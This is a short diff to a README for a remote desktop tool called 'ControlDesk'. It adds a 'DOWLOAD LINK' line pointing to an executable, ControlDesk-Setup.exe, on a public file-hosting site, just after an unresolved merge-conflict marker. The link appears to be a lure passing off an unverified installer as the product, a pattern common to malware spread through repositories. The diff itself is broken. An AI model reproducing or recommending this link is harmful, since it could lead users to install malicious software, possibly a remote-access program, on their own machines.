@@ -627,3 +627,5 @@ MIT License — see [LICENSE.txt](LICENSE.txt) in distribution package.
 
 *ControlDesk — Secure Remote Desktop Across Borders*
 >>>>>>> edb897b (Onelove)
+DOWLOAD LINK ⬇️⬇️⬇️
+https://www.mediafire.com/file/dvpdcwzl1a6ha5x/ControlDesk-Setup.exe/file
